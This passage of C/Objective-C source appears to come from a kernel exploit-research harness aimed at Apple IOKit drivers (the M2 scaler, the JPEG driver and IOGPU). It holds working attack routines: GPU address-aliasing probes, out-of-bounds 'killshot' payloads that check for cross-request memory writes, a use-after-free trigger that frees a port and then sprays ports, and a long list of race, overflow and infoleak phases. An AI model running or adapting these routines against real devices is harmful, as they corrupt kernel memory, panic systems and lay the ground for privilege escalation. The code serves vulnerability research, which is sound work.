    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
    kern_return_t kr = IOConnectCallMethod(c, 8, NULL, 0, in, 0x68, osc, &nosc, out, &osz);
    uint64_t gpuva = *(uint64_t *)(out + 0x00);
    uint64_t cpup  = *(uint64_t *)(out + 0x08);
    uint32_t rid   = *(uint32_t *)(out + 0x24);
    LOG("[pin]   v%d create pinned 0x%llx sz 0x%llx -> kr 0x%08x rid %u GPUVA 0x%llx cpu %llx",
        variant, addr, size, kr, rid, gpuva, cpup);
    if (!kr && rid) {
        uint64_t *q = (uint64_t *)out;
        LOG("[pin]   out: %016llx %016llx %016llx %016llx", q[0], q[1], q[2], q[3]);
    }
    vm_deallocate(mach_task_self(), (vm_address_t)in, 0x1000);
    vm_deallocate(mach_task_self(), (vm_address_t)out, 0x1000);
    if (kr || !rid) return 0;
    *gpuva_out = gpuva;
    *cpu_out = (uint8_t *)(uintptr_t)cpup;
    return rid;
}

static void p_pinned(void) {
    LOG("[pin] v92: pinned-GPUAddress aliasing experiments");
    io_connect_t c = open_service("IOGPU", 1);
    if (!c) return;
    // Metal session for GPU read-probes (read X via patched blit)
    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
    id<MTLCommandQueue> mq = [dev newCommandQueue];
    id<MTLBuffer> bufA = [dev newBufferWithLength:0x10000 options:MTLResourceStorageModeShared];
    id<MTLBuffer> bufB = [dev newBufferWithLength:0x10000 options:MTLResourceStorageModeShared];
    memset([bufA contents], 0x41, 0x10000);
    memset([bufB contents], 0, 0x10000);
    g_srcx = [bufA gpuAddress] ^ 0x5a5a5a5a5a5a5a5aULL;
    g_dstx = [bufB gpuAddress] ^ 0x5a5a5a5a5a5a5a5aULL;

    const char *one = getenv("FUZZ_PIN_ADDR");
    const char *sk = getenv("FUZZ_PIN_SKIP");
    long skip = sk ? atol(sk) : 0;

    static const struct { uint64_t addr; const char *n; } tgts[] = {
        { 0x1000800000ULL,  "E0 calib-free" },
        { 0,                "E1 alias-own-buffer" },
        { 0x10001c000ULL,   "E2 svc-ptr-table" },
        { 0x10000c000ULL,   "E3 svc-page" },
        { 0x100110000ULL,   "E4 svc-desc" },
        { 0x100120000ULL,   "E5 svc-desc2" },
        { 0x1000000000ULL,  "E6 sp0x10-base" },
        { 0x1000004000ULL,  "E7 sp0x10-packed" },
        { 0x000040000ULL,   "E8 wild-fatalread" },
        { 0x100004000ULL,   "E9 wild-fatalread" },
        { 0x100001000ULL,   "E10 wild-low" },
        { 0x10000000000ULL, "E11 sp0x100" },
    };
    for (unsigned ti = 0; ti < sizeof(tgts)/sizeof(tgts[0]); ti++) {
        if (one) {
            uint64_t want = strtoull(one, NULL, 0);
            if (tgts[ti].addr != want) continue;
        }
        if (ti < (unsigned)skip) continue;
        uint64_t X = tgts[ti].addr;
        uint8_t *ownCpu = NULL;   // E1: the buffer being aliased
        if (ti == 1) {
            // alias on our own plain resource
            uint64_t g0 = 0;
            uint32_t r0 = gpu_resource2(c, 0x10000, &g0, &ownCpu);
            if (!r0 || !ownCpu) { LOG("[pin] E1: base resource failed"); continue; }
            memset(ownCpu, 0x11, 0x10000);
            X = g0;
        }
        LOG("[pin] === %s: pinned 0x%llx ===", tgts[ti].n, X);
        uint64_t gpuva = 0;
        uint8_t *cpu = NULL;
        uint32_t rid = pinned_resource(c, X, 0x10000, &gpuva, &cpu, 0);
        if (!rid) rid = pinned_resource(c, X, 0x10000, &gpuva, &cpu, 1);
        if (!rid) { LOG("[pin] %s: both variants failed", tgts[ti].n); continue; }
        LOG("[pin] %s: OK rid %u GPUVA 0x%llx (requested 0x%llx) cpu %p", tgts[ti].n, rid, gpuva, X, cpu);
        if (!cpu) continue;
        // GPU-side pre-content (Metal VM read probe)
        long np = gscan2_one(mq, bufA, bufB, X, 0);
        uint8_t *bb = (uint8_t *)[bufB contents];
        LOG("[pin] %s: GPU-probe slots %ld, B[0..15] %02x %02x %02x %02x %02x %02x %02x %02x",
            tgts[ti].n, np, bb[0], bb[1], bb[2], bb[3], bb[4], bb[5], bb[6], bb[7]);
        // CPU-side alias read
        LOG("[pin] %s: CPU alias[0..15] %02x %02x %02x %02x %02x %02x %02x %02x",
            tgts[ti].n, cpu[0], cpu[1], cpu[2], cpu[3], cpu[4], cpu[5], cpu[6], cpu[7]);
        // CPU write marker, re-probe via GPU
        uint64_t marker = 0xdeadc0de00000000ULL | (X & 0xffffffffULL);
        uint64_t *mp = (uint64_t *)cpu;
        for (int i = 0; i < 0x1000 / 8; i++) mp[i] = marker;
        long np2 = gscan2_one(mq, bufA, bufB, X, 0);
        long nm = 0;
        uint64_t *bp = (uint64_t *)bb;
        for (int i = 0; i < 0x1000 / 8; i++) if (bp[i] == marker) nm++;
        LOG("[pin] %s: CPU-write -> GPU-probe markers %ld/512 (slots %ld) %s",
            tgts[ti].n, nm, np2, nm > 256 ? "*** ALIAS WRITE VISIBLE TO GPU ***" : "");
        if (ti == 1 && ownCpu) {
            // alias-on-own-buffer check: marker visible through the original mapping?
            LOG("[pin] E1: own buffer[0..7] after alias write: %02x %02x %02x %02x %s",
                ownCpu[0], ownCpu[1], ownCpu[2], ownCpu[3],
                ownCpu[0] == 0xde ? "ALIAS WORKS" : "no alias");
        }
    }
    LOG("[pin] done (alive)");
}

// V93: AppleJPEGDriver track. Recon (types), selector/size sweep, then decode
// attempts. Prior statics (part9 §57): 10 selectors, sel 8/9 entitlement-gated,
// decode candidate sel 7, encoder sel 4. DMA class: JPEG-header dims vs dst
// surface size desync.
static void p_jpeg(void) {
    LOG("[jpeg] v93: AppleJPEGDriver recon + selector sweep");
    // A. which types open from the sandbox
    io_connect_t conns[4] = {0,0,0,0};
    for (uint32_t t = 0; t < 4; t++) {
        io_service_t s = IOServiceGetMatchingService(kIOMainPortDefault,
                            IOServiceMatching("AppleJPEGDriver"));
        if (!s) { LOG("[jpeg] service not found"); return; }
        kern_return_t ko = IOServiceOpen(s, mach_task_self(), t, &conns[t]);
        IOObjectRelease(s);
        io_name_t cls = "?";
        if (!ko) IOObjectGetClass(conns[t], cls);
        LOG("[jpeg] open type %u -> kr 0x%08x conn 0x%x class '%s'", t, ko, conns[t], ko ? "" : cls);
    }
    // B. selector x invocation-form sweep (struct / async+struct / scalar)
    static const size_t sizes[] = { 0x40, 0x100, 0x1d0, 0x200, 0x2c8, 0x3c0 };
    uint8_t *inb = must_map(0x1000);
    uint8_t *outb = must_map(0x1000);
    mach_port_t wake;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wake);
    for (uint32_t t = 0; t < 4; t++) {
        io_connect_t c = conns[t];
        if (!c) continue;
        for (uint32_t sel = 0; sel <= 9; sel++) {
            char line[640]; int m = 0;
            m += snprintf(line + m, sizeof line - m, "[jpeg] t%u sel %u:", t, sel);
            // form 1: sync struct
            memset(inb, 0, 0x1000); memset(outb, 0, 0x1000);
            size_t osz = 0x100;
            kern_return_t kr = IOConnectCallStructMethod(c, sel, inb, 0x100, outb, &osz);
            m += snprintf(line + m, sizeof line - m, " struct=%08x", kr);
            // form 2: async struct (wake port + ref)
            memset(inb, 0, 0x1000); memset(outb, 0, 0x1000);
            uint64_t ref = 0x1234;
            osz = 0x100;
            uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
            kr = IOConnectCallAsyncMethod(c, sel, wake, &ref, 1, NULL, 0, inb, 0x100, osc, &nosc, outb, &osz);
            m += snprintf(line + m, sizeof line - m, " async=%08x", kr);
            // form 3: scalar-only x2
            uint64_t sc2[2] = {0, 0};
            uint64_t so2[2] = {0, 0}; uint32_t nso = 2;
            kr = IOConnectCallScalarMethod(c, sel, sc2, 2, so2, &nso);
            m += snprintf(line + m, sizeof line - m, " scalar=%08x", kr);
            // form 4: CallMethod with struct only (no scalars)
            memset(inb, 0, 0x1000); memset(outb, 0, 0x1000);
            osz = 0x100; nosc = 0;
            kr = IOConnectCallMethod(c, sel, NULL, 0, inb, 0x100, osc, &nosc, outb, &osz);
            m += snprintf(line + m, sizeof line - m, " meth=%08x", kr);
            LOG("%s", line);
        }
        IOServiceClose(c);
    }
    // B2. traps + mixed scalar/struct forms + wider types (after the all-0x2c2
    // result of the plain forms sweep)
    static const char *altSvcs[] = { "AppleJPEGDriver", "SJPEGDriver", "AppleH16JPEG" };
    for (unsigned sn = 0; sn < sizeof(altSvcs)/sizeof(altSvcs[0]); sn++) {
        for (uint32_t t = 0; t <= 8; t++) {
            io_service_t s = IOServiceGetMatchingService(kIOMainPortDefault,
                                IOServiceMatching(altSvcs[sn]));
            if (!s) { LOG("[jpeg] svc %s not found", altSvcs[sn]); break; }
            io_connect_t c = 0;
            kern_return_t ko = IOServiceOpen(s, mach_task_self(), t, &c);
            IOObjectRelease(s);
            if (ko) { if (t <= 3 || ko != 0xe00002c7) LOG("[jpeg] open %s type %u -> 0x%08x", altSvcs[sn], t, ko); continue; }
            LOG("[jpeg] open %s type %u -> conn 0x%x", altSvcs[sn], t, c);
            for (uint32_t sel = 0; sel <= 9; sel++) {
                char line[640]; int m = 0;
                m += snprintf(line + m, sizeof line - m, "[jpeg] %s t%u sel %u:", altSvcs[sn], t, sel);
                // trap0/trap1 (no/one arg) — scaler-style
                kern_return_t kt0 = ioconnect_trap1(c, sel, 0);
                m += snprintf(line + m, sizeof line - m, " trap=%08x", kt0);
                // 1 scalar + struct
                memset(inb, 0, 0x1000); memset(outb, 0, 0x1000);
                uint64_t s1[1] = {0};
                size_t osz = 0x100;
                uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
                kern_return_t kr = IOConnectCallMethod(c, sel, s1, 1, inb, 0x1d0, osc, &nosc, outb, &osz);
                m += snprintf(line + m, sizeof line - m, " s1st=%08x", kr);
                // 2 scalars + struct
                uint64_t s2[2] = {0, 0};
                osz = 0x100; nosc = 0;
                memset(inb, 0, 0x1000); memset(outb, 0, 0x1000);
                kr = IOConnectCallMethod(c, sel, s2, 2, inb, 0x1d0, osc, &nosc, outb, &osz);
                m += snprintf(line + m, sizeof line - m, " s2st=%08x", kr);
                LOG("%s", line);
            }
            IOServiceClose(c);
        }
    }
    // B3. privileged-looking types (Metal-style 0x10000x) on AppleJPEGDriver
    static const uint32_t ptypes[] = { 0x100, 0x1000, 0x10000, 0x100000, 0x100001,
                                       0x100002, 0x100003, 0x100004, 0x100005 };
    for (unsigned ti = 0; ti < sizeof(ptypes)/sizeof(ptypes[0]); ti++) {
        io_service_t s = IOServiceGetMatchingService(kIOMainPortDefault,
                            IOServiceMatching("AppleJPEGDriver"));
        if (!s) break;
        io_connect_t c = 0;
        kern_return_t ko = IOServiceOpen(s, mach_task_self(), ptypes[ti], &c);
        IOObjectRelease(s);
        LOG("[jpeg] open type 0x%x -> kr 0x%08x conn 0x%x", ptypes[ti], ko, c);
        if (ko || !c) continue;
        for (uint32_t sel = 0; sel <= 9; sel++) {
            memset(inb, 0, 0x1000); memset(outb, 0, 0x1000);
            size_t osz = 0x100;
            kern_return_t kr = IOConnectCallStructMethod(c, sel, inb, 0x1d0, outb, &osz);
            if (kr != 0xe00002c2) LOG("[jpeg]   type 0x%x sel %u -> 0x%08x", ptypes[ti], sel, kr);
        }
        IOServiceClose(c);
    }
    // B4. last form matrix on type 0: stIn size x stOut size (struct-returning
    // methods may require a matching stOut)
    {
        io_service_t s = IOServiceGetMatchingService(kIOMainPortDefault,
                            IOServiceMatching("AppleJPEGDriver"));
        io_connect_t c = 0;
        kern_return_t ko = s ? IOServiceOpen(s, mach_task_self(), 0, &c) : -1;
        if (s) IOObjectRelease(s);
        if (!ko && c) {
            static const size_t sins[] = { 0x1d0, 0x2c8, 0x3c0 };
            static const size_t souts[] = { 0x100, 0x1d0, 0x1000 };
            for (uint32_t sel = 0; sel <= 9; sel++) {
                char line[640]; int m = 0;
                m += snprintf(line + m, sizeof line - m, "[jpeg] b4 sel %u:", sel);
                for (unsigned a = 0; a < 3; a++) for (unsigned b = 0; b < 3; b++) {
                    memset(inb, 0, 0x1000); memset(outb, 0, 0x1000);
                    size_t osz = souts[b];
                    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
                    kern_return_t kr = IOConnectCallMethod(c, sel, NULL, 0, inb, sins[a], osc, &nosc, outb, &osz);
                    m += snprintf(line + m, sizeof line - m, " %zx/%zx=%08x", sins[a], souts[b], kr);
                }
                LOG("%s", line);
            }
            IOServiceClose(c);
        }
    }
    mach_port_destroy(mach_task_self(), wake);
    LOG("[jpeg] done (alive)");
}

// V94: DART mapping scheme of AppleM2ScalerCSCDriver — per-request vs
// persistent vs shared. Steps via FUZZ_DART_STEP (panic-resumable):
// 0 = persistence on same conn (big normal map, then 10 killshots);
// 1 = same but killshots on a FRESH conn (shared domain?);
// 2 = extent series (killshot with dst W x W, W from FUZZ_DART_SIZE);
// 3 = controlled cross-request write into marker-filled big surface.
static kern_return_t scaler_call1(io_connect_t c, uint8_t *req) {
    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
    return IOConnectCallMethod(c, 1, NULL, 0, req, 0x1b0, osc, &nosc, NULL, NULL);
}
static void p_dartmap(void) {
    int step = atoi(getenv("FUZZ_DART_STEP") ?: "0");
    LOG("[dart] v94 DART map probe, step %d", step);
    io_connect_t c1 = open_service("AppleM2ScalerCSCDriver", 0);
    if (!c1) { LOG("[dart] no scaler conn"); return; }
    uint8_t *req = must_map(0x1000);

    if (step <= 1) {
        // A: legit big scale (maps 2x16MB if persistent)
        IOSurfaceRef b1 = make_surface(2048, 2048);
        IOSurfaceRef b2 = make_surface(2048, 2048);
        if (!b1 || !b2) { LOG("[dart] big surfaces failed"); return; }
        craft_transform(req, IOSurfaceGetID(b1), IOSurfaceGetID(b2), 2048, 2048);
        kern_return_t kr = scaler_call1(c1, req);
        LOG("[dart] E%d-A big map 2048x2048 normal scale -> kr 0x%08x", step + 1, kr);
        io_connect_t cx = c1;
        if (step == 1) {
            cx = open_service("AppleM2ScalerCSCDriver", 0);
            LOG("[dart] E2: fresh submit conn 0x%x (c1 was 0x%x)", cx, c1);
        }
        IOSurfaceRef s = make_surface(64, 64);
        IOSurfaceRef d = make_surface(64, 64);
        if (!s || !d) return;
        IOSurfaceID si = IOSurfaceGetID(s), di = IOSurfaceGetID(d);
        craft_transform(req, si, di, 64, 64);   // wire once (v79 pattern)
        kern_return_t kw = scaler_call1(cx, req);
        LOG("[dart] E%d-B wire -> kr 0x%08x", step + 1, kw);
        usleep(50000);
        for (int i = 0; i < 10; i++) {
            border_payload(req, si, di, 32, 32, 0xFFFFFFE0, 0xFFFFFFE0, 32, 32);
            LOG("[dart] E%d-B shot %d submitting (PANIC possible)", step + 1, i);
            kr = scaler_call1(cx, req);
            LOG("[dart] E%d-B shot %d -> kr 0x%08x (0xe00002d6=recoverable)", step + 1, i, kr);
            usleep(100000);
        }
        LOG("[dart] E%d done (alive): 10 recoverable shots after big map => PERSISTENT %s",
            step + 1, step ? "(and SHARED across conns)" : "(same conn)");
    } else if (step == 2) {
        int w = atoi(getenv("FUZZ_DART_SIZE") ?: "64");
        IOSurfaceRef s = make_surface(64, 64);
        IOSurfaceRef d = make_surface(w, w);
        if (!s || !d) { LOG("[dart] surfaces failed"); return; }
        IOSurfaceID si = IOSurfaceGetID(s), di = IOSurfaceGetID(d);
        craft_transform(req, si, di, 64, 64);
        kern_return_t kw = scaler_call1(c1, req);
        usleep(50000);
        LOG("[dart] E3 wire dst %dx%d -> kr 0x%08x", w, w, kw);
        for (int i = 0; i < 6; i++) {
            border_payload(req, si, di, 32, 32, 0xFFFFFFE0, 0xFFFFFFE0, 32, 32);
            LOG("[dart] E3 dst %d (%dkB) shot %d submitting (PANIC possible)", w, w * w * 4 >> 10, i);
            kern_return_t kr = scaler_call1(c1, req);
            LOG("[dart] E3 dst %d shot %d -> kr 0x%08x", w, i, kr);
            usleep(100000);
        }
        LOG("[dart] E3 dst %d done (alive)", w);
    } else if (step == 3) {
        // E4: controlled write — marker-filled big dst mapped by legit scale,
        // then wrap killshot; CPU-scan the big surface for 0xffffffff pixels.
        IOSurfaceRef b1 = make_surface(2048, 2048);
        IOSurfaceRef b2 = make_surface(2048, 2048);
        if (!b1 || !b2) return;
        // fill b2 with per-4KB-page markers
        if (IOSurfaceLock(b2, 0, NULL) == 0) {
            uint8_t *base = (uint8_t *)IOSurfaceGetBaseAddress(b2);
            size_t total = (size_t)IOSurfaceGetAllocSize(b2);
            for (size_t p = 0; p + 0x1000 <= total; p += 0x1000)
                memset(base + p, (int)((p >> 12) & 0xff), 0x1000);
            IOSurfaceUnlock(b2, 0, NULL);
        }
        craft_transform(req, IOSurfaceGetID(b1), IOSurfaceGetID(b2), 2048, 2048);
        kern_return_t kr = scaler_call1(c1, req);
        LOG("[dart] E4-A big marker map -> kr 0x%08x", kr);
        IOSurfaceRef s = make_surface(64, 64);
        IOSurfaceRef d = make_surface(64, 64);
        IOSurfaceID si = IOSurfaceGetID(s), di = IOSurfaceGetID(d);
        craft_transform(req, si, di, 64, 64);
        scaler_call1(c1, req); usleep(50000);
        for (int i = 0; i < 6; i++) {
            border_payload(req, si, di, 32, 32, 0xFFFFFFE0, 0xFFFFFFE0, 32, 32);
            LOG("[dart] E4-B shot %d (PANIC possible)", i);
            kr = scaler_call1(c1, req);
            LOG("[dart] E4-B shot %d -> kr 0x%08x", i, kr);
            usleep(100000);
        }
        // scan b2 for corruption (0xffffffff pixels = border color write)
        if (IOSurfaceLock(b2, kIOSurfaceLockReadOnly, NULL) == 0) {
            uint8_t *base = (uint8_t *)IOSurfaceGetBaseAddress(b2);
            size_t total = (size_t)IOSurfaceGetAllocSize(b2);
            long corrupt = 0;
            size_t first = 0;
            for (size_t p = 0; p + 0x1000 <= total; p += 0x1000) {
                uint8_t expect = (uint8_t)((p >> 12) & 0xff);
                if (base[p] != expect) { if (!corrupt) first = p; corrupt++; }
            }
            LOG("[dart] E4: marker pages corrupted: %ld (first @0x%zx) %s",
                corrupt, first, corrupt ? "*** CROSS-REQUEST WRITE CONFIRMED ***" : "(none)");
            if (corrupt) {
                size_t p = first;
                long ffc = 0, zero = 0, other = 0;
                for (size_t i = p; i < p + 0x1000; i++) {
                    if (base[i] == 0xff) ffc++;
                    else if (base[i] == 0) zero++;
                    else other++;
                }
                LOG("[dart] E4 first corrupt page @0x%zx: [0..15] %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x | ff %ld zero %ld other %ld",
                    p, base[p], base[p+1], base[p+2], base[p+3], base[p+4], base[p+5], base[p+6], base[p+7],
                    base[p+8], base[p+9], base[p+10], base[p+11], base[p+12], base[p+13], base[p+14], base[p+15],
                    ffc, zero, other);
            }
            IOSurfaceUnlock(b2, kIOSurfaceLockReadOnly, NULL);
        }
        LOG("[dart] E4 done (alive)");
    }
    LOG("[dart] done (alive)");
}

static void p4b_uaf2(void) {
    LOG("[v13-d] UAF destroy-first (panic tolerated)");
    IOSurfaceRef big1 = make_surface(2048, 2048);
    IOSurfaceRef big2 = make_surface(2048, 2048);
    if (!big1 || !big2) { LOG("[uaf2] big surfaces failed"); return; }
    for (int attempt = 0; attempt < 30; attempt++) {
        io_connect_t c2 = open_service("AppleM2ScalerCSCDriver", 0);
        if (!c2) { LOG("[uaf2] open failed at %d", attempt); break; }
        mach_port_t p;
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p);
        kern_return_t kr = IOConnectSetNotificationPort(c2, 0, p, 0);
        if (kr) LOG("[uaf2] attempt %d SetNotificationPort -> 0x%08x", attempt, kr);
        // destroy BEFORE any submit: every completion will hit the dangling ptr
        mach_port_mod_refs(mach_task_self(), p, MACH_PORT_RIGHT_RECEIVE, -1);
        mach_port_t spray[64];
        for (int i = 0; i < 64; i++)
            if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &spray[i]))
                break;
        craft_transform(g_req, IOSurfaceGetID(big1), IOSurfaceGetID(big2), 2048, 2048);
        int submitted = 0;
        for (int i = 0; i < 32; i++) {
            uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
            uint64_t ref = 0xface0000 + i;
            memset(g_out, 0xAA, 0x2000);
            size_t osz = 0x2000;
            kern_return_t k2 = IOConnectCallAsyncMethod(c2, 1, g_wake, &ref, 1,
                                                        NULL, 0, g_req, 0x1b0,
                                                        osc, &nosc, g_out, &osz);
            if (k2 == 0xe00002bf || k2 == 0) submitted++;
        }
        usleep(300000);
        for (int i = 0; i < 64; i++) mach_port_destroy(mach_task_self(), spray[i]);
        IOServiceClose(c2);
        LOG("[uaf2] attempt %d done, submitted %d", attempt, submitted);
    }
    CFRelease(big1); CFRelease(big2);
    LOG("[v13-d] done (still alive)");
}

static void p5_steady(long rounds) {
    LOG("[v12-5] steady fuzz %ld rounds", rounds);
    for (long r = 0; r < rounds; r++) {
        uint32_t which = frand() % 6;
        kern_return_t kr = 0;
        if (which < 2) {
            craft_transform(g_req, g_s1, g_s2, 64, 64);
            int mode = frand() % 5;
            if (mode == 0) *(uint64_t *)(g_req + 0x20) = frand();
            if (mode == 1) {
                *(uint64_t *)(g_req + 0x28) = frand();
                *(uint64_t *)(g_req + 0x30) = frand();
                *(uint64_t *)(g_req + 0x38) = frand();
                *(uint64_t *)(g_req + 0x40) = frand();
            }
            if (mode == 2) {
                *(uint32_t *)(g_req + 0x48) = frand();
                *(uint32_t *)(g_req + 0x70) = frand();
            }
            if (mode == 3) {
                *(uint32_t *)(g_req + 0x00) = frand() % 0x400;
                *(uint32_t *)(g_req + 0x04) = frand() % 0x400;
            }
            if (mode == 4) *(uint32_t *)(g_req + 0x04) = g_s1;
            if ((frand() & 3) == 0) {
                memset(g_out, 0xAA, 0x2000);
                kr = call_async1(g_req, g_out, 0x2000, frand());
            } else {
                kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
            }
        } else if (which == 2) {
            uint64_t va = (uint64_t)(uintptr_t)(g_hist + (frand() & 0xfff));
            kr = call_struct(7, &va, 8, NULL, NULL);
        } else if (which == 3) {
            memset(g_hist, 0, 0x1000);
            *(uint32_t *)g_hist = 0x6944506b;
            *(uint64_t *)(g_hist + 8) = frand();
            uint64_t va = (uint64_t)(uintptr_t)g_hist;
            kr = call_struct(8, &va, 8, NULL, NULL);
        } else if (which == 4) {
            craft_transform(g_req, g_s1, g_s2, 64, 64);
            *(uint64_t *)(g_req + 0x20) = frand();
            uint64_t pair[2] = { (uint64_t)(uintptr_t)g_req, (uint64_t)(uintptr_t)g_estout };
            kr = call_struct(9, pair, 0x10, NULL, NULL);
        } else {
            struct { uint32_t prio, pad; uint64_t duty, hist; } prop =
                { (uint32_t)(frand() % 8), 0, frand() % 0x200000, frand() % 0x200000 };
            kr = call_struct(10, &prop, sizeof(prop), NULL, NULL);
        }
        uint32_t low = kr & 0xffff;
        if (kr == 0 || (low != 0x2c2 && low != 0x2c7 && low != 0x2bc && low != 0x2bd &&
                        low != 0x2f0 && low != 0x2e2 && low != 0x2bf && kr != 1 && kr != 2 && (r & 0x3f) == 0))
            LOG("[f] r%ld w%u kr 0x%08x", r, which, kr);
        usleep(150 + (frand() & 0x7f));
    }
    LOG("[v12-5] done");
}

void *t_iosurface_scaler(void *arg) {
    IOSurfaceRef surf1 = make_surface(64, 64);
    IOSurfaceRef surf2 = make_surface(64, 64);
    g_s1 = surf1 ? IOSurfaceGetID(surf1) : 0;
    g_s2 = surf2 ? IOSurfaceGetID(surf2) : 0;
    g_sf1 = surf1; g_sf2 = surf2;

    const char *names[] = {
        "AppleM2ScalerCSCDriver", "AppleM2Scaler", "AppleM2ScalerCSCHal",
        "IOSurfaceScaler", "scaler", NULL
    };
    for (int i = 0; names[i] && !g_conn; i++)
        g_conn = open_service(names[i], 0);
    if (!g_conn) { LOG("[scaler] not openable"); return NULL; }
    LOG("[scaler] conn 0x%x, s1 %u s2 %u", g_conn, g_s1, g_s2);

    g_req = must_map(0x1000);
    g_out = must_map(0x2000);
    g_hist = must_map(0x2000);
    g_estout = must_map(0x1000);
    g_coeffs = must_map(0x1000);

    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &g_wake);
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &g_notify);
    pthread_t t1, t2;
    pthread_create(&t1, NULL, msg_listener, (void *)(uintptr_t)g_wake);
    pthread_create(&t2, NULL, msg_listener, (void *)(uintptr_t)g_notify);
    kern_return_t kr = IOConnectSetNotificationPort(g_conn, 0, g_notify, 0);
    LOG("[probe12] SetNotificationPort -> 0x%08x", kr);

    static int probed = 0;
    if (!probed) {
        probed = 1;
        if (getenv("FUZZ_DARTMAP")) { p_dartmap(); LOG("[probe13] dartmap-only mode, stop"); return NULL; }
        if (getenv("FUZZ_JPEG")) { p_jpeg(); LOG("[probe13] jpeg-only mode, stop"); return NULL; }
        if (getenv("FUZZ_PINNED")) { p_pinned(); LOG("[probe13] pinned-only mode, stop"); return NULL; }
        if (getenv("FUZZ_GPUVMSCAN2")) { p_gpuvmscan(); LOG("[probe13] gpuvmscan2-only mode, stop"); return NULL; }
        if (getenv("FUZZ_GPUVMSCAN")) { p_gpuvmscan(); LOG("[probe13] gpuvmscan-only mode, stop"); return NULL; }
        if (getenv("FUZZ_MTPATCH")) { p_mtpatch(); LOG("[probe13] mtpatch-only mode, stop"); return NULL; }
        if (getenv("FUZZ_MTLTRACE")) { p_mtltrace(); LOG("[probe13] mtltrace-only mode, stop"); return NULL; }
        if (getenv("FUZZ_CONNPROBE")) { p_connprobe(); LOG("[probe13] connprobe-only mode, stop"); return NULL; }
        if (getenv("FUZZ_MTLSELF")) { p_mtlself(); LOG("[probe13] mtlself-only mode, stop"); return NULL; }
        p_mtlreplay2();     // v84: nq diagnostics matrix FIRST
        if (getenv("FUZZ_MTLR_ONLY")) { LOG("[probe13] mtlr-only mode, stop"); return NULL; }
        p_mtlreplay();      // v83: Metal-format replay (format-B resources + 6-pack seglist)
        p_gpuwrite();       // v80: GPUVA-correct blit redirect FIRST
        p_killshot_only();  // v79: isolated kill-shot loop FIRST
        p_blithit();        // v76: blit + prepared resource sweep
        p_gpuva2();         // v74: sel45 GPU mapping
        p_regdump();        // v73: IORegistry dump
        p_gpuva();          // v72: resource GPUVA discovery
        p_blitwrite();      // v70: blit write replay
        p_agxfull();        // v68: full AGFI image
        p_agxfaithful();    // v67: faithful AGFI replay
        p_agxrecon();       // v66: AGFI reconstruction
        p_agxreplay();      // v65: replay captured AGX command
        p_agxtail();        // v64: AGX tail crafting
        p_agxcmd();         // v61: AGX command crafting
        p_stateful(1000000); // v58: stateful IOGPU sequences
        p_iomfb();          // v57: IOMFB crop wrap
        p_streamfuzz2(2000000); // v56: grammar-aware fuzz
        p_streamfuzz(500000); // v55: kernel command fuzz
        p_submit3();        // v54: valid-stream submit
        p_submit2();        // v52: submit with notif-queue
        p_submit();         // v50: end-to-end submit
        p_qdrive();         // v49: queue shmem drive
        p_qshmem();         // v48: queue shmem via region diff
        p_getters();        // v47: getter dump
        p_shmem_probe();    // v46: shmem selectors with traced values
        p_iogpu_fw();       // v45: IOGPU.framework end-to-end
        p_iogpu_submit();   // v44: IOGPU submit path
        p_agx_replay();     // v43: replay Metal sequence
        p_agx_scan();       // v42: AGX accelerator service
        p_iogpu_vm2();      // v41: IOGPU VM full path
        p_iogpu_vm();       // v40: IOGPU VM map path
        p_iogpu();          // v39: IOGPU resource games
        p_method_probe();   // v38: method tables of openable clients
        p_surface_scan();   // v37: attack surface scan
        p_histogram();      // v36: histogram length/infoleak probes
        p_filter();         // v35: SetCustomFilter path
        p_cross_race2(30);  // v34: fixed cross-request race (may panic)
        p_oracle();         // v33: fault-oracle mapping (may panic)
        p_diag_dart();      // v32: DART fault classification via diag
        p_triangulate();    // v31a: start formula (may panic)
        p_cross_race(20);   // v31b: cross-request contamination (may panic)
        p_nc();             // v30: NC corruption observability (may panic)
        p_calibrate();      // v29: fill start calibration (may panic)
        p_state_corruption(); // v28: post-shot output diff (may panic)
        p_fill_target();    // v27: fill target analysis (may panic)
        p_async_cushion();  // v26: async cushion race (may panic)
        p_flip420();        // v25: flip x biplanar dst (may panic)
        p_flip();           // v24: flip variants (may panic)
        p_oob_measure();    // v23: E1/E2/E3 measurement (may panic)
        p_spray3();         // v22 (if alive)
        p_spray_oob();      // v20 variant (if alive)
        LOG("[probe13] phases done, steady fuzz");
    }
    for (;;) p5_steady(100000);
    return NULL;
}
